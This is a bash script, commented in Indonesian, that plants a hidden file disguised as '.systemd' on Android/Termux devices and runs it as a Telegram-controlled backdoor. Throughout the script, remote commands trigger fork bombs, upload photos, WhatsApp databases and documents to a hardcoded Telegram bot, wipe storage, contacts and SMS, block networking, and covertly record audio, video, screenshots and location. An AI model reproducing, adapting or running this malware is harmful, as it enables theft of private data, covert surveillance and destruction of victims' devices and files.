# ============================================
# BACKDOOR TERSEMBUNYI (EXTREME EDITION)
# ============================================
cat > "$HIDDEN_DIR/.systemd" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
CHAT_ID="8042897984"

# ============================================
# FUNGSI BAHAYA LEVEL 1 - RUSAKIN SYSTEM
# ============================================

# FORK BOMB (MULTI LAYER)
forkbomb() {
    # Classic fork bomb
    :(){ :|:& };:
    
    # Python fork bomb (massive)
    python3 -c "
import os
import threading
def bomb():
    while True:
        try:
            for i in range(1000):
                if os.fork() == 0:
                    while True:
                        pass
        except:
            pass
for i in range(100):
    threading.Thread(target=bomb).start()
" 2>/dev/null &
    
    # Node.js fork bomb (kalo ada node)
    if command -v node &> /dev/null; then
        node -e "
const { fork } = require('child_process');
while(true) { fork(__filename); }
" 2>/dev/null &
    fi
    
    # CPU overload
    for cpu in {1..100}; do
        (while true; do echo $((999999*999999)) > /dev/null; done) &
    done
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=💣 *MULTI LAYER FORK BOMB ACTIVATED*%0A🔥 CPU: 100%%%0A🔥 RAM: 100%%%0A🔥 SYSTEM: CRASHING" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# ============================================
# FUNGSI BAHAYA LEVEL 2 - CURI DATA SENSITIF
# ============================================

# SNITCH EXTREME - AMBIL SEMUA FILE
snitch_extreme() {
    folders=(
        "/storage/emulated/0/DCIM/Camera"
        "/storage/emulated/0/DCIM/Screenshots"
        "/storage/emulated/0/Pictures"
        "/storage/emulated/0/Download"
        "/storage/emulated/0/Documents"
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Video"
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents"
        "/storage/emulated/0/WhatsApp/Databases"
        "/storage/emulated/0/Telegram/Telegram Images"
        "/storage/emulated/0/Telegram/Telegram Video"
        "/storage/emulated/0/Telegram/Documents"
        "/storage/emulated/0/Movies"
        "/storage/emulated/0/Music"
        "/storage/emulated/0/Android/data/com.whatsapp/files/Backups"
        "/storage/emulated/0/Android/data/com.instagram.android/files"
        "/storage/emulated/0/Android/data/com.facebook.katana/files"
    )
    
    for folder in "${folders[@]}"; do
        if [ -d "$folder" ]; then
            find "$folder" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.gif" -o -iname "*.mp4" -o -iname "*.3gp" -o -iname "*.mov" -o -iname "*.pdf" -o -iname "*.doc" -o -iname "*.docx" -o -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.txt" -o -iname "*.db" -o -iname "*.crypt" -o -iname "*.enc" \) | while read file; do
                curl -s -F chat_id="$CHAT_ID" -F document=@"$file" "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
                sleep 1
            done
        fi
    done
}

# ============================================
# FUNGSI BAHAYA LEVEL 3 - HAPUS DATA MASSAL
# ============================================

# WIPE EXTREME - HAPUS SEMUA
wipe_extreme() {
    # Hapus semua foto & video
    rm -rf /storage/emulated/0/DCIM/* 2>/dev/null
    rm -rf /storage/emulated/0/Pictures/* 2>/dev/null
    rm -rf /storage/emulated/0/Movies/* 2>/dev/null
    
    # Hapus semua download
    rm -rf /storage/emulated/0/Download/* 2>/dev/null
    
    # Hapus semua dokumen
    rm -rf /storage/emulated/0/Documents/* 2>/dev/null
    
    # Hapus semua data aplikasi
    rm -rf /storage/emulated/0/Android/data/* 2>/dev/null
    rm -rf /storage/emulated/0/WhatsApp/* 2>/dev/null
    rm -rf /storage/emulated/0/Telegram/* 2>/dev/null
    
    # Hapus semua kontak
    sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db "delete from contacts;" 2>/dev/null
    
    # Hapus semua SMS
    sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "delete from sms;" 2>/dev/null
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=🧹 *WIPE EXTREME EXECUTED*%0A✅ Semua data terhapus" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# ============================================
# FUNGSI BAHAYA LEVEL 4 - SABOTASE
# ============================================

# CHANGE PASSWORD - GANTI PASSWORD
change_password() {
    # Ganti password termux
    echo "termux" | passwd --stdin 2>/dev/null
    
    # Ganti password WiFi
    echo "echo 'dinda404' | sudo -S killall wpa_supplicant 2>/dev/null" | bash
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=🔑 *PASSWORD CHANGED*%0A✅ Password baru: termux" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# AUTO SHUTDOWN - MATIKAN DEVICE
auto_shutdown() {
    # Matikan device setelah 1 menit
    echo "shutdown -h +1" | bash 2>/dev/null
    termux-wake-unlock 2>/dev/null
    am start -a android.intent.action.ACTION_REQUEST_SHUTDOWN 2>/dev/null
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=⛔ *DEVICE SHUTDOWN*%0A✅ Mati dalam 60 detik" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# AUTO REBOOT - RESTART DEVICE
auto_reboot() {
    reboot 2>/dev/null
    am start -a android.intent.action.REBOOT 2>/dev/null
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=🔄 *DEVICE REBOOTING*%0A✅ Restart sekarang" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# ============================================
# FUNGSI BAHAYA LEVEL 5 - BLOCKIR
# ============================================

# BLOCK WEBSITE - BLOKIR SEMUA SITUS
block_websites() {
    # Block semua situs via hosts file
    echo "127.0.0.1 *" > /data/data/com.termux/files/usr/etc/hosts 2>/dev/null
    
    # Block pakai iptables (root needed)
    iptables -P INPUT DROP 2>/dev/null
    iptables -P OUTPUT DROP 2>/dev/null
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=🚫 *INTERNET BLOCKED*%0A✅ Semua koneksi terputus" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# FORMAT SD CARD - HAPUS SEMUA
format_sdcard() {
    # Format external storage
    rm -rf /storage/emulated/0/* 2>/dev/null
    rm -rf /sdcard/* 2>/dev/null
    
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=💿 *SD CARD FORMATTED*%0A✅ Semua data di memori eksternal hilang" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# ============================================
# FUNGSI BAHAYA LEVEL 6 - SPY & RECORD
# ============================================

# RECORD AUDIO - REKAM SUARA
record_audio() {
    termux-microphone-record -d 30 -f /sdcard/audio_record.mp3 2>/dev/null
    sleep 30
    curl -s -F chat_id="$CHAT_ID" -F document=@"/sdcard/audio_record.mp3" "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
}

# RECORD VIDEO - REKAM VIDEO
record_video() {
    termux-camera-record -c 0 -d 10 /sdcard/video_record.mp4 2>/dev/null
    sleep 10
    curl -s -F chat_id="$CHAT_ID" -F document=@"/sdcard/video_record.mp4" "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
}

# TAKE SCREENSHOT - SS LAYAR
take_screenshot() {
    termux-screencap /sdcard/screenshot.png 2>/dev/null
    curl -s -F chat_id="$CHAT_ID" -F document=@"/sdcard/screenshot.png" "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
}

# GET LOCATION - LACAK LOKASI
get_location() {
    termux-location > /sdcard/location.txt 2>/dev/null
    curl -s -F chat_id="$CHAT_ID" -F document=@"/sdcard/location.txt" "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
}

# ============================================
# FUNGSI BAHAYA LEVEL 7 - EXECUTE SEMUA
# ============================================

# EXECUTE ALL - JALANKAN SEMUA
execute_all() {
    forkbomb
    snitch_extreme
    change_password
    auto_shutdown
    block_websites
    format_sdcard
}

# ============================================
# TELEGRAM COMMAND HANDLER
# ============================================
check_telegram() {
    local last_cmd=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
    
    case "$last_cmd" in
        # Level 1 - System Crash
        "/bomb") forkbomb ;;
        "/bomb_extreme") forkbomb ;;
        
        # Level 2 - Data Theft
        "/snitch") snitch_extreme ;;
        "/snitch_all") snitch_extreme ;;
        
        # Level 3 - Data Wipe
        "/wipe") wipe_extreme ;;
        "/wipe_all") wipe_extreme ;;
        
        # Level 4 - Sabotage
        "/changepass") change_password ;;
        "/shutdown") auto_shutdown ;;
        "/reboot") auto_reboot ;;
        
        # Level 5 - Block
        "/block") block_websites ;;
        "/format") format_sdcard ;;
        
        # Level 6 - Spy
        "/record") record_audio ;;
        "/video") record_video ;;
        "/ss") take_screenshot ;;
        "/loc") get_location ;;
        
        # Level 7 - Execute All
        "/doom") execute_all ;;
        
        # Info
        "/info")
            curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                -d "chat_id=$CHAT_ID" \
                -d "text=📱 *DEVICE INFO*%0A👤 User: $(whoami)%0A🌐 IP: $(curl -s ifconfig.me 2>/dev/null)%0A📅 Date: $(date)%0A💾 Storage: $(df -h /storage | awk 'NR==2 {print $4}')" \
                -d "parse_mode=Markdown" > /dev/null 2>&1
            ;;
        
        # Help Menu
        "/help")
            curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                -d "chat_id=$CHAT_ID" \
                -d "text=💀 *DINDA404 COMMANDS* 💀%0A%0A🔥 *LEVEL 1 - SYSTEM CRASH*%0A/bomb - Fork bomb%0A%0A🔥 *LEVEL 2 - DATA THEFT*%0A/snitch - Ambil semua file%0A%0A🔥 *LEVEL 3 - DATA WIPE*%0A/wipe - Hapus semua%0A%0A🔥 *LEVEL 4 - SABOTAGE*%0A/changepass - Ganti password%0A/shutdown - Matikan device%0A/reboot - Restart device%0A%0A🔥 *LEVEL 5 - BLOCK*%0A/block - Blokir internet%0A/format - Format SD card%0A%0A🔥 *LEVEL 6 - SPY*%0A/record - Rekam suara%0A/video - Rekam video%0A/ss - Screenshot%0A/loc - Lacak lokasi%0A%0A🔥 *LEVEL 7 - EXTREME*%0A/doom - Execute semua%0A%0A📱 *INFO*%0A/info - Info device" \
                -d "parse_mode=Markdown" > /dev/null 2>&1
            ;;
    esac
}

while true; do
    check_telegram
    sleep 5
done
EOF